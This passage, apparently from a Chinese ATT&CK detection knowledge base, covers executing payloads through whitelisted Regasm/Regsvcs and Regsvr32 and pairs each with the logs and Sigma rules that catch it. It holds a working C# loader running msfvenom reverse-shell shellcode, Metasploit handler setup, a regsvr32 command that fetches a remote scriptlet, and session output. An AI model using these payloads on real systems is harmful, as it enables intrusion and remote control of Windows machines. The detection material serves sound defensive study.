<p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#dllcs","title":"\u751f\u6210\u6076\u610fdll\u7684cs\u6587\u4ef6","text":"<p>\u4e0b\u8f7d\u5730\u5740:https://github.com/222222amor/exp_notes/commit/d3471f1d4617fd5423bb85d41b4ec4f8c72332fc</p> <pre><code>using System;\nusing System.EnterpriseServices;\nusing System.Runtime.InteropServices;\n\n/*\n\nAuthor: Casey Smith, Twitter: @subTee\nLicense: BSD 3-Clause\n\nCreate Your Strong Name Key -&gt; key.snk\n\n$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content key.snk -Value $Content -Encoding Byte\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk regsvcs.cs\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe regsvcs.dll\n[OR]\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe regsvcs.dll\n//Executes UnRegisterClass If you don't have permissions\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U regsvcs.dll\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U regsvcs.dll\n//This calls the UnregisterClass Method\n\n*/\nnamespace regsvcser\n{\n\npublic class Bypass : ServicedComponent\n{\npublic Bypass() { Console.WriteLine(\"I am a basic COM Object\"); }\n\n[ComRegisterFunction] //This executes if registration is successful\npublic static void RegisterClass ( string key )\n{\nConsole.WriteLine(\"I shouldn't really execute\");\nShellcode.Exec();\n}\n\n[ComUnregisterFunction] //This executes if registration fails\npublic static void UnRegisterClass ( string key )\n{\nConsole.WriteLine(\"I shouldn't really execute either.\");\nShellcode.Exec();\n}\n}\n\npublic class Shellcode\n{\npublic static void Exec()\n{\n// native function's compiled code\n// generated with metasploit\n// executes calc.exe\nbyte[] shellcode = new byte[341] { #\u66ff\u6362\u6210\u4f60\u81ea\u5df1\u751f\u6210\u7684\n0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,\n0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,\n0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,\n0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,\n0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,\n0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,\n0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,\n0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,\n0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,\n0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,\n0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,\n0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x7e,0x92,\n0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,\n0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,\n0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,\n0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,\n0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,\n0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,\n0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,\n0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,\n0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,\n0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,\n0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };\n\n\n\nUInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,\nMEM_COMMIT, PAGE_EXECUTE_READWRITE);\nMarshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);\nIntPtr hThread = IntPtr.Zero;\nUInt32 threadId = 0;\n// prepare data\n\n\nIntPtr pinfo = IntPtr.Zero;\n\n// execute native code\n\nhThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\nWaitForSingleObject(hThread, 0xFFFFFFFF);\nreturn;\n}\n\nprivate static UInt32 MEM_COMMIT = 0x1000;\n\nprivate static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n[DllImport(\"kernel32\")]\nprivate static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,\nUInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\n\n[DllImport(\"kernel32\")]\nprivate static extern IntPtr CreateThread(\n\nUInt32 lpThreadAttributes,\nUInt32 dwStackSize,\nUInt32 lpStartAddress,\nIntPtr param,\nUInt32 dwCreationFlags,\nref UInt32 lpThreadId\n\n);\n\n[DllImport(\"kernel32\")]\nprivate static extern UInt32 WaitForSingleObject(\n\nIntPtr hHandle,\nUInt32 dwMilliseconds\n);\n\n\n}\n\n}\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#msfvenomcpayload","title":"msfvenom\u751f\u6210C#\u683c\u5f0f\u7684payload","text":"<pre><code>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#dll","title":"\u751f\u6210DLL","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs\n\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.dll  /unsafe C:\\Users\\Administrator\\Desktop\\a\\regsvcs.cs #keyfile:key.snk \u53ef\u5ffd\u7565\n</code></pre> <p>regsvcs.exe\u52a0\u8f7d\u6216\u5378\u8f7d\u6307\u5b9adll\u65f6\u8be5dll\u5fc5\u987b\u7b7e\u540d\u624d\u53ef\u6267\u884c\u6210\u529f\uff0c\u56e0\u6b64\u547d\u4ee4\u4e2d\u4f7f\u7528\u7684key.snk\u6587\u4ef6\u4e3adll\u7b7e\u540d\u6587\u4ef6\uff0c\u662f\u7531sn.exe\u751f\u6210\u7684\u516c\u94a5\u548c\u79c1\u94a5\u5bf9\uff0c\u5982\u679c\u6ca1\u6709sn\u547d\u4ee4\u4f60\u53ef\u80fd\u9700\u8981\u5b89\u88c5vs\u6216\u8005Microsoft SDKs\u3002\u547d\u4ee4\uff1a<code>sn.exe -k key.snk</code></p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<p>\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b)</p> <pre><code>msf5 &gt; use exploits/multi/handler\nmsf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 4444\nlport =&gt; 4444\nmsf5 exploit(multi/handler) &gt; set AutoRunScript migrate f\nAutoRunScript =&gt; migrate f\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U Micropoor.dll\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe Micropoor.dll\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Sending stage (180291 bytes) to 192.168.126.156\n[*] Meterpreter session 2 opened (192.168.126.146:4444 -&gt; 192.168.126.156:49963) at 2020-04-13 17:24:11 +0800\nmeterpreter &gt; getsid\nServer SID: S-1-5-21-3661619627-1912079458-2426250727-500\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u7ecf\u8fc7\u914d\u7f6e\u540e\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a</p> <pre><code>\u8fdb\u7a0b\u4fe1\u606f: #4688-1\n\u65b0\u8fdb\u7a0b ID:0x9f8\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c\n\u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe  /U Micropoor.dll\n\n\u8fdb\u7a0b\u4fe1\u606f: #4688-2\n\u65b0\u8fdb\u7a0b ID:0x8f0\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c\n\u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe  Micropoor.dll\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790Regsvcs.exe\u548cRegasm.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83Regsvcs.exe\u548cRegasm.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728Regsvcs.exe\u6216Regasm.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-009</p> <p>https://attack.mitre.org/techniques/T1218/009/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload</p> <p>https://micro8.gitbook.io/micro8/contents-1/71-80/73-ji-yu-bai-ming-dan-regasm.exe-zhi-hang-payload-di-san-ji</p> <p>\u514d\u6740\u8fdc\u63a7\u4e13\u9898</p> <p>http://sec.nmask.cn/article_content?a_id=8233eefd6b2671799b46d7cbab7ee672</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/","title":"T1218-010-win-\u57fa\u4e8e\u767d\u540d\u5355Regsvr32\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u547d\u4ee4\u884c\u7a0b\u5e8fRegsvr32.exe\u7528\u4e8e\u5728Windows\u7cfb\u7edf\u4e0a\u6ce8\u518c\u548c\u6ce8\u9500\u5bf9\u8c61\u94fe\u63a5\u53ca\u5d4c\u5165\u63a7\u4ef6\uff0c\u5305\u62ec\u52a8\u6001\u94fe\u63a5\u5e93\uff08DLL\uff09\u3002Regsvr32.exe\u53ef\u7528\u4e8e\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7regsvr32.exe\u8fdb\u7a0b\u6267\u884c\u53ca\u5176\u52a0\u8f7d\u6a21\u5757\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528regsvr32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002Regsvr32.exe\u4e5f\u662f\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>Regsvr32.exe\u8fd8\u53ef\u7528\u4e8e\u4e13\u95e8\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\uff0c\u65b9\u6cd5\u662f\u52a0\u8f7dCOM\u811a\u672c\u5c0f\u7a0b\u5e8f\u5728\u7528\u6237\u6743\u9650\u4e0b\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u7531\u4e8eregsvr32.exe\u5177\u6709\u7f51\u7edc\u548c\u4ee3\u7406\u611f\u77e5\u529f\u80fd\uff0c\u53ef\u4ee5\u5728\u8c03\u7528\u671f\u95f4\u5c06URL\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u5230\u5916\u90e8web\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\u6765\u52a0\u8f7d\u811a\u672c\u3002\u6b64\u65b9\u6cd5\u4e0d\u5bf9\u6ce8\u518c\u8868\u8fdb\u884c\u4efb\u4f55\u66f4\u6539\uff0c\u56e0\u4e3aCOM\u5bf9\u8c61\u5b9e\u9645\u4e0a\u672a\u6ce8\u518c\uff0c\u4ec5\u6267\u884c\u3002\u8fd9\u4e2a\u6280\u672f\u53d8\u79cd\u901a\u5e38\u79f0\u4e3a\u201cSquiblydoo\u201d\u653b\u51fb\uff0c\u5df2\u88ab\u653b\u51fb\u8005\u7528\u4e8e\u9488\u5bf9\u653f\u5e9c\u7684\u6d3b\u52a8\u4e2d\u3002</p> <p>\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4f1a\u5229\u7528Regsvr32.exe\u6765\u6ce8\u518cCOM\u5bf9\u8c61\u4ee5\u4fbf\u901a\u8fc7COM\u52ab\u6301\u5efa\u7acb\u6301\u4e45\u6027\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662f Windows \u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c\u3002WinXP\u53ca\u4ee5\u4e0a\u7cfb\u7edf\u7684regsvr32.exe\u5728windows\\system32\u6587\u4ef6\u5939\u4e0b\uff1b2000\u7cfb\u7edf\u7684regsvr32.exe\u5728winnt\\system32\u6587\u4ef6\u5939\u4e0b\u3002\u4f46\u642d\u914dregsvr32.exe\u4f7f\u7528\u7684 DLL\uff0c\u9700\u8981\u63d0\u4f9b DllRegisterServer \u548c DllUnregisterServer\u4e24\u4e2a\u8f93\u51fa\u51fd\u5f0f\uff0c\u6216\u8005\u63d0\u4f9bDllInstall\u8f93\u51fa\u51fd\u6570\u3002</p> <p>\u8bf4\u660e\uff1aRegsvr32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cRegsvr32\u547d\u4ee4\u53ef\u8bc6\u522b\u3002</p> <p>\u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <pre><code>C:\\WINDOWS\\SysWOW64\\regsvr32.exe\nC:\\WINDOWS\\system32\\regsvr32.exe\n</code></pre> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awin7\uff08sysmon\u65e5\u5fd7\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#msf","title":"\u914d\u7f6eMSF","text":"<pre><code>msf5 &gt; use exploit/multi/script/web_delivery\nmsf5 exploit(multi/script/web_delivery) &gt; set target 3\ntarget =&gt; 3\nmsf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/script/web_delivery) &gt; run\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Using URL: http://0.0.0.0:8080/06Yud7aXXqYqT\n[*] Local IP: http://192.168.126.146:8080/06Yud7aXXqYqT\n[*] Server started.\n[*] Run the following command on the target machine:\nregsvr32 /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>regsvr32 /s /n /u /i:http://192.168.126.146:8080/jnOUcgr0b0 scrobj.dll\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/script/web_delivery) &gt; [*] 192.168.126.149  web_delivery - Handling .sct Request\n[*] 192.168.126.149  web_delivery - Delivering Payload (1900 bytes)\n[*] 192.168.126.149  web_delivery - Handling .sct Request\n</code></pre> <p>\u4ee5\u5931\u8d25\u544a\u7ec8\uff0cwindows powershell\u5df2\u505c\u6b62\u5de5\u4f5c</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>EventID\uff1a1\nImage: C:\\Windows\\System32\\regsvr32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Microsoft(C) Register Server\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: REGSVR32.EXE\nCommandLine: regsvr32  /s /n /u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll\n# sysmon\u65e5\u5fd7\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-010-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Regsvr32 Anomaly\nstatus: experimental\ndescription: Detects various anomalies in relation to regsvr32.exe\nauthor: Florian Roth\ndate: 2019/01/16\nreferences:\n    - https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html\ntags:\n    - attack.t1117\n    - attack.defense_evasion\n    - attack.execution\n    - car.2019-04-002\n    - car.2019-04-003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image: '*\\regsvr32.exe'\n        CommandLine: '*\\Temp\\\\*'\n    selection2:\n        Image: '*\\regsvr32.exe'\n        ParentImage: '*\\powershell.exe'\n    selection3:\n        Image: '*\\regsvr32.exe'\n        ParentImage: '*\\cmd.exe'\n    selection4:\n        Image: '*\\regsvr32.exe'\n        CommandLine:\n            - '*/i:http* scrobj.dll'\n            - '*/i:ftp* scrobj.dll'\n    selection5:\n        Image: '*\\wscript.exe'\n        ParentImage: '*\\regsvr32.exe'\n    selection6:\n        Image: '*\\EXCEL.EXE'\n        CommandLine: '*..\\..\\..\\Windows\\System32\\regsvr32.exe *'\n    condition: 1 of them\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: 